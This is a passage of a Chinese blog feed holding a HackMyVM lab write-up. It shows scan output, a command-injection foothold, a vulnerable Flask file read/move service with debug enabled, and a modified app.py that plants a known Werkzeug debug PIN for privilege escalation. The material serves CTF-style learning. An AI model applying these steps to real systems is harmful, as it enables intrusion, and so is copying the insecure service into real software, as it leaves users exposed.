class="hljs-string">&quot;HTTP/1\.1\x20405\x20METHOD\x20NOT\x20ALLOWED\r\nServer</span><br><span class="hljs-string">SF::\x20Werkzeug/3\.1\.3\x20Python/3\.9\.2\r\nDate:\x20Thu,\x2029\x20May\x</span><br><span class="hljs-string">SF:202025\x2003:25:35\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf</span><br><span class="hljs-string">SF:-8\r\nAllow:\x20POST,\x20OPTIONS\r\nContent-Length:\x20153\r\nAccess-Co</span><br><span class="hljs-string">SF:ntrol-Allow-Origin:\x20\*\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20h</span><br><span class="hljs-string">SF:tml&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;405\x20Method\x20Not\x20Allowed&lt;/title&gt;</span><br><span class="hljs-string">SF:\n&lt;h1&gt;Method\x20Not\x20Allowed&lt;/h1&gt;\n&lt;p&gt;The\x20method\x20is\x20not\x20a</span><br><span class="hljs-string">SF:llowed\x20for\x20the\x20requested\x20URL\.&lt;/p&gt;\n&quot;</span>)%r(HTTPOptions,E1,<span class="hljs-string">&quot;HT</span><br><span class="hljs-string">SF:TP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20Python/3\.9\.2\r</span><br><span class="hljs-string">SF:\nDate:\x20Thu,\x2029\x20May\x202025\x2003:25:35\x20GMT\r\nContent-Type</span><br><span class="hljs-string">SF::\x20text/html;\x20charset=utf-8\r\nAllow:\x20POST,\x20OPTIONS\r\nAcces</span><br><span class="hljs-string">SF:s-Control-Allow-Origin:\x20\*\r\nContent-Length:\x200\r\nConnection:\x2</span><br><span class="hljs-string">SF:0close\r\n\r\n&quot;</span>)%r(RTSPRequest,1F4,<span class="hljs-string">&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-/</span><br><span class="hljs-string">SF:/W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;htt</span><br><span class="hljs-string">SF:p://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head</span><br><span class="hljs-string">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="hljs-string">SF:x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\</span><br><span class="hljs-string">SF:x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h</span><br><span class="hljs-string">SF:1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20</span><br><span class="hljs-string">SF:\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code</span><br><span class="hljs-string">SF:\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20s</span><br><span class="hljs-string">SF:yntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/</span><br><span class="hljs-string">SF:html&gt;\n&quot;</span>)%r(Help,1EF,<span class="hljs-string">&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20H</span><br><span class="hljs-string">SF:TML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\.w3\.o</span><br><span class="hljs-string">SF:rg/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;</span><br><span class="hljs-string">SF:text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Erro</span><br><span class="hljs-string">SF:r\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span><br><span class="hljs-string">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x</span><br><span class="hljs-string">SF:20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#x27;HELP&#x27;\)\.&lt;/p</span><br><span class="hljs-string">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20</span><br><span class="hljs-string">SF:HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsup</span><br><span class="hljs-string">SF:ported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span>);<br>MAC Address: 08:00:27:32:28:EA (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 1.066 days (since Tue May 27 21:52:29 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=264 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   1.20 ms 192.168.56.108<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 95.00 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.290KB)<br></code></pre></td></tr></table></figure><p>dirsearch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">Target: http://192.168.56.108/<br><br>[23:32:46] Starting:                                                                                                                    <br>[23:32:47] 403 -  279B  - /.ht_wsr.txt                                      <br>[23:32:47] 403 -  279B  - /.htaccess.bak1                                   <br>[23:32:47] 403 -  279B  - /.htaccess.orig                                   <br>[23:32:47] 403 -  279B  - /.htaccess.sample                                 <br>[23:32:47] 403 -  279B  - /.htaccess.save<br>[23:32:47] 403 -  279B  - /.htaccess_extra                                  <br>[23:32:47] 403 -  279B  - /.htaccessBAK<br>[23:32:47] 403 -  279B  - /.htaccess_orig<br>[23:32:47] 403 -  279B  - /.htaccess_sc<br>[23:32:47] 403 -  279B  - /.htaccessOLD<br>[23:32:47] 403 -  279B  - /.htaccessOLD2<br>[23:32:47] 403 -  279B  - /.htm                                             <br>[23:32:47] 403 -  279B  - /.html<br>[23:32:47] 403 -  279B  - /.htpasswds                                       <br>[23:32:47] 403 -  279B  - /.htpasswd_test                                   <br>[23:32:47] 403 -  279B  - /.httr-oauth<br>[23:32:48] 403 -  279B  - /.php                                             <br>[23:32:50] 200 -  644B  - /admin.php                                        <br>[23:33:06] 403 -  279B  - /server-status/                                   <br>[23:33:06] 403 -  279B  - /server-status                                    <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>可以看到除了80端口和22端口以外还开放了一个5001端口，服务用的是Werkzeug&#x2F;3.1.3 Python&#x2F;3.9.2，当时上网搜了一下好像是个web框架的底层库，里面提到了一般和flask集成，我就想会不会是flask模板的ssti注入或者算pin值进console之类的，不过事实证明我方向完全错了。</p><p>（其实也不是完全错，事后一看B神的wp里提供了更改pin码设置后开启dubug进入console直接反弹shell提权的思路。)</p><p>之后我再去找这个库有没有什么现成的洞可以打，但是找到的全是3.0.x版本的，这条路也走不通了。</p><p>访问web主页。</p><p><img src="/2025/05/29/HackMyVM-translate/pH7UFqF60J.png"></p><p>看了源码，没啥东西，没有key，没有提示，之后访问&#x2F;admin.php,是个登录界面，也是光秃秃的啥都没有。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_f5DrV3RHIs.png"></p><p>在yakit用rockyou爆了半小时之后我放弃了。</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>什么路都走不通，只能去访问刚刚的5001端口。nmap的扫描报告给了一些信息，首先它必须要求POST访问。</p><p>改成POST之后还要我们接着改content-type，改成json形式</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_yszKIAg2wX.png"></p><p>提示让我们按照它的格式填键值对。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_fG3ZiM6sEI.png"></p><p>这里第三个参数的格式是text_list，需要用方括号括起来。</p><p>返回的值是空值。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_SicwfeMpka.png"></p><p>测试一下存在命令执行点，即为text_list的值。</p><p>哇这边本来想看一下当前目录结果直接给刚刚登录界面的账号密码了。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_MbmfVK5thD.png"></p><p>但是看了一眼没有写的权限，本来还想写个webshell上去。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_wE1xHuJUAh.png"></p><p>那只能反弹shell了，cat一下passwd，有bash，不过没装nc，用bash弹吧。</p><p>拿到的第一件事是升级成pty</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_erJqKubMOH.png"></p><p>但是这里我们也只是www-data，很小的一个权限，之后想办法提权吧</p><p>拿到userflag</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_VjV1wqtPt1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userflag:flag&#123;user-51860845-225a-42f3-b492-0a63bc722a96&#125;<br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>两种思路</p><p>第一种是B神wp提供的，因为&#x2F;home&#x2F;welcome&#x2F;py里存放了flask服务的app.py源码，所以可以直接自定义一个PIN码供我们进入到console。</p><p>首先建立端口转发，这里因为不知道ssh口类所以不能用ssh，wget传一个chisel，将靶机的8000端口代理到本地的3000端口上。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_xjNQoFWnob.png"></p><p>访问端口，发现是一个文件移动的服务。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_J3aYUH2SWH.png"></p><p>事实上就是利用了app.py的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python">www-data@translate:/home/welcome/py$ cat app.py <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/id&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_id</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 执行id命令并获取输出</span><br>        output = os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;id.html&#x27;</span>, id_info=output)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_page</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">return</span> read_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;read.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/move&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_page</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> move_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;move.html&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = request.args.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供文件路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(file_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        <span class="hljs-comment"># 返回文件内容</span><br>        <span class="hljs-keyword">return</span> send_file(file_path)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_file</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = request.get_json()<br>        source_path = data.get(<span class="hljs-string">&#x27;source&#x27;</span>)<br>        target_path = data.get(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_path <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> target_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供源文件路径和目标路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(source_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;源文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        <span class="hljs-comment"># 确保目标目录存在</span><br>        target_dir = os.path.dirname(target_path)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(target_dir):<br>            os.makedirs(target_dir)<br>        <br>        <span class="hljs-comment"># 移动文件</span><br>        shutil.move(source_path, target_path)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;文件移动成功&#x27;</span>, <span class="hljs-string">&#x27;target_path&#x27;</span>: target_path&#125;)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>很明显，因为tmp目录下我们可读可写，可以利用这个服务使用我们的恶意app.py替换掉它。</p><p>接下来有两种思路。</p><p>第一种是B神wp提供的，因为&#x2F;home&#x2F;welcome&#x2F;py里存放了flask服务的app.py源码，而且开启了debug，不需要重启服务，所以可以直接自定义一个PIN码供我们进入到console。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">from flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><br>os_environ[<span class="hljs-string">&#x27;WERKZEUG_DEBUG_PIN&#x27;</span>] = <span class="hljs-string">&#x27;123-456-789&#x27;</span><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/id&#x27;</span>)<br>def show_id():<br>    <span class="hljs-keyword">try</span>:<br>        # 执行id命令并获取输出<br>        output = os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;id.html&#x27;</span>, id_info=output)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def read_page():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">return</span> read_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;read.html&#x27;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/move&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def move_page():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> move_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;move.html&#x27;</span>)<br><br>def read_file():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = request.args.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br>        <span class="hljs-keyword">if</span> not file_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供文件路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> not os.path.exists(file_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        # 返回文件内容<br>        <span class="hljs-keyword">return</span> send_file(file_path)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br>def move_file():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">data</span> = request.get_json()<br>        source_path = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;source&#x27;</span>)<br>        target_path = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> not source_path or not target_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供源文件路径和目标路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> not os.path.exists(source_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;源文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        # 确保目标目录存在<br>        target_dir = os.path.dirname(target_path)<br>        <span class="hljs-keyword">if</span> not os.path.exists(target_dir):<br>            os.makedirs(target_dir)<br>        <br>        # 移动文件<br>        shutil.move(source_path, target_path)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;文件移动成功&#x27;</span>, <span class="hljs-string">&#x27;target_path&#x27;</span>: target_path&#125;)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=True)<br></code></pre></td></tr></table></figure><p>想法很美好，但是当我们输入&#x2F;tmp&#x2F;app.py时会提示我们文件不存在</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_Q1oTxq2DEF.png"></p><p>这里就是这个靶场考察的一个重点：tmp隔离</p><p>如果系统的systemd开启了PrivateTmp属性，那么这个服务访问到的tmp不是真的tmp路径，而是一个私有的目录，这里就是由apache生成的。</p><p>但是我们不知道这个目录的绝对路径是到底在哪，所以不能用那个文件移动来复制它。</p><p>那么有没有方法绕过隔离呢？答案很简单，我们之所以被隔离是因为我们用的是apache这个服务下面的命令执行来反弹，只要在其他的rce点反弹就行了。</p><p>比如最开始的那个POST注入点。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_WttcLSpweQ.png"></p><p><img src="/2025/05/29/HackMyVM-translate/vmware_tLSYNasyst.png"></p><p>（感谢HYH大佬帮我指出错误，自己当时真尼玛铸币啊，能被这个卡一两个小时，唉。）</p><p>那么就能轻松加愉快的输PIN进到console反弹shell了，剩下的明天再补吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-THEFINALS</title>
    <link href="/2025/05/28/HackMyVM-THEFINALS/"/>
    <url>/2025/05/28/HackMyVM-THEFINALS/</url>
    
    <content type="html"><![CDATA[<p>大佬群友做的靶机。关于如何设置VM和virtualbox联动网上已经有很详细的教程了，这里不再赘述。只提一点，一定要确保靶机环境完全启动之后再进行前期的准备工作（血的教训啊），不过群友做的靶机都很友好，IP直接给了不用arpscan费事扫。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>靶机ip:192.168.56.105</p><p>nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.105<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-28 11:11 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating ARP Ping Scan at 11:11<br>Scanning 